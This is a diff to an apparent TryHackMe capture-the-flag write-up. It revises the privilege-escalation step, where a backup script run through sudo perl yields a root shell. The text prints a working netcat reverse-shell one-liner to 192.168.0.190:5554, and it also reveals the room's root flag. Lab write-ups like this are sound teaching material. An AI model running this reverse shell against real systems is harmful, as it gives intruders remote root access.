@@ -72,9 +72,9 @@ system("sh", "/etc/copy.sh");
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 ```
 
-It seems that it already has a reverse shell in this script. I just edited and placed my IP there.  
-**sudo** /usr/bin/perl /home/itguy/backup.pl
+It seems that it already has a reverse shell in this script. I just changed the 192... IP with my own.  
 
+**sudo** /usr/bin/perl /home/itguy/backup.pl
 On our second listener, we got a second shell. This time, under root privileges.  
 
 **Second and final flag is at /root/root.txt and is THM{6637f41d0177b6f37cb20d775124699f}** **[2]**.  
